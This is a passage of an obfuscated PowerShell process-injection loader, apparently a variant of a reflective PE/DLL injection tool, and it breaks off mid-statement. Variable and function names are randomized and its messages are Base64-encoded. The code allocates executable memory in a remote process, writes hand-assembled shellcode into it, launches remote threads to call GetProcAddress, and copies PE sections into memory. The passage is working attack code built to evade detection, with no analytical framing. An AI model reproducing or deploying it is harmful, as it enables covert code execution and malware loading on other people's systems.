			${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${c4f807f864764303a3ad397e56ddef65}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${11d3c51aa0a647699eb3fbf8ae4d6e0c}, ${3b1ba4c013b1469784f85eaa004a0cb7}, $false)
			${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${3ff8b22ecd6e4e91a20a6c4bd8305519})
			d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${1b52eca41c6642cc8fe2a376fb4aaa59} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${3b1ba4c013b1469784f85eaa004a0cb7}
			${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${1b52eca41c6642cc8fe2a376fb4aaa59}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${69dbee7f4a0d4729be43a2fd77403ae0}, ${3b1ba4c013b1469784f85eaa004a0cb7}, $false)
			${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${3ff8b22ecd6e4e91a20a6c4bd8305519})
			d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${b39b78ec90f34b74958eedeba9e058ee} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${3b1ba4c013b1469784f85eaa004a0cb7}
			${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${b39b78ec90f34b74958eedeba9e058ee}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${03acbdbf363740749483799da2078d89}, ${3b1ba4c013b1469784f85eaa004a0cb7}, $false)
			${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${3ff8b22ecd6e4e91a20a6c4bd8305519})
			d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${84507904eccf4701bbdb095157e38476} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${3b1ba4c013b1469784f85eaa004a0cb7}
			${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${84507904eccf4701bbdb095157e38476}.Length)
			${17c67be0ad4a44d5afa1f03d7e7a2c48} = $Win32Functions.VirtualAllocEx.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, [IntPtr]::Zero, [UIntPtr][UInt64]${8910ffb6f9af4222aaa37c26fd3c4509}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if (${17c67be0ad4a44d5afa1f03d7e7a2c48} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
			}
			${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.WriteProcessMemory.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${17c67be0ad4a44d5afa1f03d7e7a2c48}, ${07df5eb296244663a059021557847f1e}, [UIntPtr][UInt64]${8910ffb6f9af4222aaa37c26fd3c4509}, [Ref]${ebaa2d792332466cb1cf1a277e96e1b3})
			if ((${b252c80d481e4d599d8c2226f6c56423} -eq $false) -or ([UInt64]${ebaa2d792332466cb1cf1a277e96e1b3} -ne [UInt64]${8910ffb6f9af4222aaa37c26fd3c4509}))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
			}
			${e177cfe1613b4b2488837e5483433c99} = ef987d4149fa413e954cb531fe969a83 -de6617bbc6024f2b859287e674e79d55 ${b8098c5a8297473498a6b72001bbfcf1} -e8467a7c0eca496ebed04014d585d83a ${17c67be0ad4a44d5afa1f03d7e7a2c48} -Win32Functions $Win32Functions
			${8e08ff89ff934c1fbfa999be923764fb} = $Win32Functions.WaitForSingleObject.Invoke(${e177cfe1613b4b2488837e5483433c99}, 20000)
			if (${8e08ff89ff934c1fbfa999be923764fb} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[IntPtr]${1d81b3a5f1fa4933b2307c96b4099570} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${3ff8b22ecd6e4e91a20a6c4bd8305519})
			${8e08ff89ff934c1fbfa999be923764fb} = $Win32Functions.ReadProcessMemory.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${03acbdbf363740749483799da2078d89}, ${1d81b3a5f1fa4933b2307c96b4099570}, [UIntPtr][UInt64]${3ff8b22ecd6e4e91a20a6c4bd8305519}, [Ref]${ebaa2d792332466cb1cf1a277e96e1b3})
			if (${8e08ff89ff934c1fbfa999be923764fb} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${70b16b0363e34f158e8bc36f60ca05b6} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${1d81b3a5f1fa4933b2307c96b4099570}, [Type][IntPtr])
			$Win32Functions.VirtualFreeEx.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${03acbdbf363740749483799da2078d89}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			$Win32Functions.VirtualFreeEx.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${17c67be0ad4a44d5afa1f03d7e7a2c48}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		}
		else
		{
			[IntPtr]${e177cfe1613b4b2488837e5483433c99} = ef987d4149fa413e954cb531fe969a83 -de6617bbc6024f2b859287e674e79d55 ${b8098c5a8297473498a6b72001bbfcf1} -e8467a7c0eca496ebed04014d585d83a ${69dbee7f4a0d4729be43a2fd77403ae0} -d1405e3afc3e4e01af7af611dcf0f07c ${11d3c51aa0a647699eb3fbf8ae4d6e0c} -Win32Functions $Win32Functions
			${8e08ff89ff934c1fbfa999be923764fb} = $Win32Functions.WaitForSingleObject.Invoke(${e177cfe1613b4b2488837e5483433c99}, 20000)
			if (${8e08ff89ff934c1fbfa999be923764fb} -ne 0)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
			}
			[Int32]${18026d20288943bcbb7a36d2f3a98a59} = 0
			${8e08ff89ff934c1fbfa999be923764fb} = $Win32Functions.GetExitCodeThread.Invoke(${e177cfe1613b4b2488837e5483433c99}, [Ref]${18026d20288943bcbb7a36d2f3a98a59})
			if ((${8e08ff89ff934c1fbfa999be923764fb} -eq 0) -or (${18026d20288943bcbb7a36d2f3a98a59} -eq 0))
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEcAZQB0AEUAeABpAHQAQwBvAGQAZQBUAGgAcgBlAGEAZAAgAGYAYQBpAGwAZQBkAA==')))
			}
			[IntPtr]${70b16b0363e34f158e8bc36f60ca05b6} = [IntPtr]${18026d20288943bcbb7a36d2f3a98a59}
		}
		$Win32Functions.VirtualFreeEx.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${11d3c51aa0a647699eb3fbf8ae4d6e0c}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		return ${70b16b0363e34f158e8bc36f60ca05b6}
	}
	Function e9ad1f9879a345188325161363978ac3
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		${b8098c5a8297473498a6b72001bbfcf1},
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		${ed615d0b93c44407a4e40daa0f5a1b6d},
		[Parameter(Position=2, Mandatory=$true)]
		[IntPtr]
		${b11ed9979c314057bf90b0aa93610804},
        [Parameter(Position=3, Mandatory=$true)]
        [Bool]
        ${e16a606a58064cb8bf4f324faf0df9ce}
		)
		${3ff8b22ecd6e4e91a20a6c4bd8305519} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[IntPtr]${03927a490a72422f9071711b7fd5ca09} = [IntPtr]::Zero   
        if (-not ${e16a606a58064cb8bf4f324faf0df9ce})
        {
        	${b901d24efb9d4ba6b718c36dbdc6a70d} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${b11ed9979c314057bf90b0aa93610804})
		    ${4b82cc39e7654793bafd88f63c712b2e} = [UIntPtr][UInt64]([UInt64]${b901d24efb9d4ba6b718c36dbdc6a70d}.Length + 1)
		    ${03927a490a72422f9071711b7fd5ca09} = $Win32Functions.VirtualAllocEx.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, [IntPtr]::Zero, ${4b82cc39e7654793bafd88f63c712b2e}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		    if (${03927a490a72422f9071711b7fd5ca09} -eq [IntPtr]::Zero)
		    {
			    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		    }
		    [UIntPtr]${ebaa2d792332466cb1cf1a277e96e1b3} = [UIntPtr]::Zero
		    ${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.WriteProcessMemory.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${03927a490a72422f9071711b7fd5ca09}, ${b11ed9979c314057bf90b0aa93610804}, ${4b82cc39e7654793bafd88f63c712b2e}, [Ref]${ebaa2d792332466cb1cf1a277e96e1b3})
		    if (${b252c80d481e4d599d8c2226f6c56423} -eq $false)
		    {
			    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABEAEwATAAgAHAAYQB0AGgAIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMAIABtAGUAbQBvAHIAeQA=')))
		    }
		    if (${4b82cc39e7654793bafd88f63c712b2e} -ne ${ebaa2d792332466cb1cf1a277e96e1b3})
		    {
			    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGQAbgAnAHQAIAB3AHIAaQB0AGUAIAB0AGgAZQAgAGUAeABwAGUAYwB0AGUAZAAgAGEAbQBvAHUAbgB0ACAAbwBmACAAYgB5AHQAZQBzACAAdwBoAGUAbgAgAHcAcgBpAHQAaQBuAGcAIABhACAARABMAEwAIABwAGEAdABoACAAdABvACAAbABvAGEAZAAgAHQAbwAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAA==')))
		    }
        }
        else
        {
            ${03927a490a72422f9071711b7fd5ca09} = ${b11ed9979c314057bf90b0aa93610804}
        }
		${e04853482a0844609e341ee78518fdf4} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		${abb172930bf74b728a574fcaf72aa9df} = $Win32Functions.GetProcAddress.Invoke(${e04853482a0844609e341ee78518fdf4}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))) 
		${86427444c2f64603962e259059d671b5} = $Win32Functions.VirtualAllocEx.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, [IntPtr]::Zero, [UInt64][UInt64]${3ff8b22ecd6e4e91a20a6c4bd8305519}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
		if (${86427444c2f64603962e259059d671b5} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIAB0AGgAZQAgAHIAZQB0AHUAcgBuACAAdgBhAGwAdQBlACAAbwBmACAARwBlAHQAUAByAG8AYwBBAGQAZAByAGUAcwBzAA==')))
		}
		[Byte[]]${d7b6b0a2d97b4b49be993b87ee42cfc5} = @()
		if (${b5905e299da14ea186abe1140fee1a54}.PE64Bit -eq $true)
		{
			${6bc788a027aa4878a923defd0b65f55d} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${2fde7fe7d1e740b2b8558243d219784c} = @(0x48, 0xba)
			${1f1a16b1cb2d4cb28287f3ec6568a4ec} = @(0x48, 0xb8)
			${a628bb96b5f3419ea59c673569cc8df8} = @(0xff, 0xd0, 0x48, 0xb9)
			${48f3ec1bb04f4cf49a8d1d58354f9ea9} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${6bc788a027aa4878a923defd0b65f55d} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${2fde7fe7d1e740b2b8558243d219784c} = @(0xb9)
			${1f1a16b1cb2d4cb28287f3ec6568a4ec} = @(0x51, 0x50, 0xb8)
			${a628bb96b5f3419ea59c673569cc8df8} = @(0xff, 0xd0, 0xb9)
			${48f3ec1bb04f4cf49a8d1d58354f9ea9} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		${8910ffb6f9af4222aaa37c26fd3c4509} = ${6bc788a027aa4878a923defd0b65f55d}.Length + ${2fde7fe7d1e740b2b8558243d219784c}.Length + ${1f1a16b1cb2d4cb28287f3ec6568a4ec}.Length + ${a628bb96b5f3419ea59c673569cc8df8}.Length + ${48f3ec1bb04f4cf49a8d1d58354f9ea9}.Length + (${3ff8b22ecd6e4e91a20a6c4bd8305519} * 4)
		${3b1ba4c013b1469784f85eaa004a0cb7} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${8910ffb6f9af4222aaa37c26fd3c4509})
		${07df5eb296244663a059021557847f1e} = ${3b1ba4c013b1469784f85eaa004a0cb7}
		d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${6bc788a027aa4878a923defd0b65f55d} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${3b1ba4c013b1469784f85eaa004a0cb7}
		${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${6bc788a027aa4878a923defd0b65f55d}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${ed615d0b93c44407a4e40daa0f5a1b6d}, ${3b1ba4c013b1469784f85eaa004a0cb7}, $false)
		${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${3ff8b22ecd6e4e91a20a6c4bd8305519})
		d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${2fde7fe7d1e740b2b8558243d219784c} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${3b1ba4c013b1469784f85eaa004a0cb7}
		${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${2fde7fe7d1e740b2b8558243d219784c}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${03927a490a72422f9071711b7fd5ca09}, ${3b1ba4c013b1469784f85eaa004a0cb7}, $false)
		${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${3ff8b22ecd6e4e91a20a6c4bd8305519})
		d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${1f1a16b1cb2d4cb28287f3ec6568a4ec} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${3b1ba4c013b1469784f85eaa004a0cb7}
		${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${1f1a16b1cb2d4cb28287f3ec6568a4ec}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${abb172930bf74b728a574fcaf72aa9df}, ${3b1ba4c013b1469784f85eaa004a0cb7}, $false)
		${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${3ff8b22ecd6e4e91a20a6c4bd8305519})
		d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${a628bb96b5f3419ea59c673569cc8df8} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${3b1ba4c013b1469784f85eaa004a0cb7}
		${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${a628bb96b5f3419ea59c673569cc8df8}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${86427444c2f64603962e259059d671b5}, ${3b1ba4c013b1469784f85eaa004a0cb7}, $false)
		${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${3ff8b22ecd6e4e91a20a6c4bd8305519})
		d7d2ae269baa46a58bd04253c3153bc2 -edfb5fb877c340feb6fd2a333d64fd54 ${48f3ec1bb04f4cf49a8d1d58354f9ea9} -cc9e6267b5c84fa69bc06f7a58cb4fb0 ${3b1ba4c013b1469784f85eaa004a0cb7}
		${3b1ba4c013b1469784f85eaa004a0cb7} = c36a6fff11ae41aab0147e8eb916744d ${3b1ba4c013b1469784f85eaa004a0cb7} (${48f3ec1bb04f4cf49a8d1d58354f9ea9}.Length)
		${17c67be0ad4a44d5afa1f03d7e7a2c48} = $Win32Functions.VirtualAllocEx.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, [IntPtr]::Zero, [UIntPtr][UInt64]${8910ffb6f9af4222aaa37c26fd3c4509}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
		if (${17c67be0ad4a44d5afa1f03d7e7a2c48} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
		}
		[UIntPtr]${ebaa2d792332466cb1cf1a277e96e1b3} = [UIntPtr]::Zero
		${b252c80d481e4d599d8c2226f6c56423} = $Win32Functions.WriteProcessMemory.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${17c67be0ad4a44d5afa1f03d7e7a2c48}, ${07df5eb296244663a059021557847f1e}, [UIntPtr][UInt64]${8910ffb6f9af4222aaa37c26fd3c4509}, [Ref]${ebaa2d792332466cb1cf1a277e96e1b3})
		if ((${b252c80d481e4d599d8c2226f6c56423} -eq $false) -or ([UInt64]${ebaa2d792332466cb1cf1a277e96e1b3} -ne [UInt64]${8910ffb6f9af4222aaa37c26fd3c4509}))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
		}
		${e177cfe1613b4b2488837e5483433c99} = ef987d4149fa413e954cb531fe969a83 -de6617bbc6024f2b859287e674e79d55 ${b8098c5a8297473498a6b72001bbfcf1} -e8467a7c0eca496ebed04014d585d83a ${17c67be0ad4a44d5afa1f03d7e7a2c48} -Win32Functions $Win32Functions
		${8e08ff89ff934c1fbfa999be923764fb} = $Win32Functions.WaitForSingleObject.Invoke(${e177cfe1613b4b2488837e5483433c99}, 20000)
		if (${8e08ff89ff934c1fbfa999be923764fb} -ne 0)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
		}
		[IntPtr]${1d81b3a5f1fa4933b2307c96b4099570} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${3ff8b22ecd6e4e91a20a6c4bd8305519})
		${8e08ff89ff934c1fbfa999be923764fb} = $Win32Functions.ReadProcessMemory.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${86427444c2f64603962e259059d671b5}, ${1d81b3a5f1fa4933b2307c96b4099570}, [UIntPtr][UInt64]${3ff8b22ecd6e4e91a20a6c4bd8305519}, [Ref]${ebaa2d792332466cb1cf1a277e96e1b3})
		if ((${8e08ff89ff934c1fbfa999be923764fb} -eq $false) -or (${ebaa2d792332466cb1cf1a277e96e1b3} -eq 0))
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFIAZQBhAGQAUAByAG8AYwBlAHMAcwBNAGUAbQBvAHIAeQAgAGYAYQBpAGwAZQBkAA==')))
		}
		[IntPtr]${f7978749563e4567aadff6ff8e8c1813} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${1d81b3a5f1fa4933b2307c96b4099570}, [Type][IntPtr])
		$Win32Functions.VirtualFreeEx.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${17c67be0ad4a44d5afa1f03d7e7a2c48}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
		$Win32Functions.VirtualFreeEx.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${86427444c2f64603962e259059d671b5}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        if (-not ${e16a606a58064cb8bf4f324faf0df9ce})
        {
            $Win32Functions.VirtualFreeEx.Invoke(${b8098c5a8297473498a6b72001bbfcf1}, ${03927a490a72422f9071711b7fd5ca09}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
		return ${f7978749563e4567aadff6ff8e8c1813}
	}
	Function d7bc93360cf646c6a5a5d709f2ea3884
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		${c8e0d86ea0e74817acb552fc5014588b},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		${b5905e299da14ea186abe1140fee1a54},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${becf8c3d80c34e9fbea46c736519a57b} = 0; ${becf8c3d80c34e9fbea46c736519a57b} -lt ${b5905e299da14ea186abe1140fee1a54}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${becf8c3d80c34e9fbea46c736519a57b}++)
		{
			[IntPtr]${eabe84ac112549f3851692ee08783edf} = [IntPtr](c36a6fff11ae41aab0147e8eb916744d ([Int64]${b5905e299da14ea186abe1140fee1a54}.SectionHeaderPtr) (${becf8c3d80c34e9fbea46c736519a57b} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${14ecf8c5dec94a688a133f47fb0633fd} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${eabe84ac112549f3851692ee08783edf}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${20a7cb85f2334d6e8dffe0be260d2792} = [IntPtr](c36a6fff11ae41aab0147e8eb916744d ([Int64]${b5905e299da14ea186abe1140fee1a54}.PEHandle) ([Int64]${14ecf8c5dec94a688a133f47fb0633fd}.VirtualAddress))
			${1d5221ae7969416c9d955a8e01d3bfd2} = ${14ecf8c5dec94a688a133f47fb0633fd}.SizeOfRawData
			if (${14ecf8c5dec94a688a133f47fb0633fd}.PointerToRawData -eq 0)
			{
				${1d5221ae7969416c9d955a8e01d3bfd2} = 0
			}
			if (${1d5221ae7969416c9d955a8e01d3bfd2} -gt ${14ecf8c5dec94a688a133f47fb0633fd}.VirtualSize)
			{
				${1d5221ae7969416c9d955a8e01d3bfd2} = ${14ecf8c5dec94a688a133f47fb0633fd}.VirtualSize
			}
			if (${1d5221ae7969416c9d955a8e01d3bfd2} -gt 0)
			{
				a1e9aa887dff49f193f787680e08120c -d97abdfba05048a9adf731f2568896bb $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBhAHIAcwBoAGEAbABDAG8AcAB5AA=='))) -b5905e299da14ea186abe1140fee1a54 ${b5905e299da14ea186abe1140fee1a54} -e8467a7c0eca496ebed04014d585d83a ${20a7cb85f2334d6e8dffe0be260d2792} -acd1470f6ef3448bb8a0459bcfc8e55e ${1d5221ae7969416c9d955a8e01d3bfd2} | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy(${c8e0d86ea0e74817acb552fc5014588b}, [Int32]${14ecf8c5dec94a688a133f47fb0633fd}.PointerToRawData, ${20a7cb85f2334d6e8dffe0be260d2792}, ${1d5221ae7969416c9d955a8e01d3bfd2})
			}
			if (${14ecf8c5dec94a688a133f47fb0633fd}.SizeOfRawData -lt ${14ecf8c5dec94a688a133f47fb0633fd}.VirtualSize)
			{
				${21b39f834bd74f0baf54630d5fe94a91} = ${14ecf8c5dec94a688a133f47fb0633fd}.VirtualSize - ${1d5221ae7969416c9d955a8e01d3bfd2}
				[IntPtr]${e8467a7c0eca496ebed04014d585d83a} = [IntPtr](c36a6fff11ae41aab0147e8eb916744d ([Int64]${20a7cb85f2334d6e8dffe0be260d2792}) ([Int64]${1d5221ae7969416c9d955a8e01d3bfd2}))
				a1e9aa887dff49f193f787680e08120c -d97abdfba05048a9adf731f2568896bb $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBlAG0AcwBlAHQA'))) -b5905e299da14ea186abe1140fee1a54 ${b5905e299da14ea186abe1140fee1a54} -e8467a7c0eca496ebed04014d585d83a ${e8467a7c0eca496ebed04014d585d83a} -acd1470f6ef3448bb8a0459bcfc8e55e ${21b39f834bd74f0baf54630d5fe94a91} | Out-Null
				$Win32Functions.memset.Invoke(${e8467a7c0eca496ebed04014d585d83a}, 0, [IntPtr]${21b39f834bd74f0baf54630d5fe94a91}) | Out-Null
			}
		}
	}
	Function d85b0f374a6643b8be26a0c88e868708
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${b5905e299da14ea186abe1140fee1a54},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${bbdf587793764367b319a04d6eb00abe},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		[Int64]${f62729f32249420fb9a8cfd6d15854c2} = 0
		${63f1190cd6cc41f0b3c13f222f7c17e9} = $true 
		[UInt32]${f918a1f8c04a44fca18cc70d4ba3aa9a} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		if ((${bbdf587793764367b319a04d6eb00abe} -eq [Int64]${b5905e299da14ea186abe1140fee1a54}.EffectivePEHandle) `
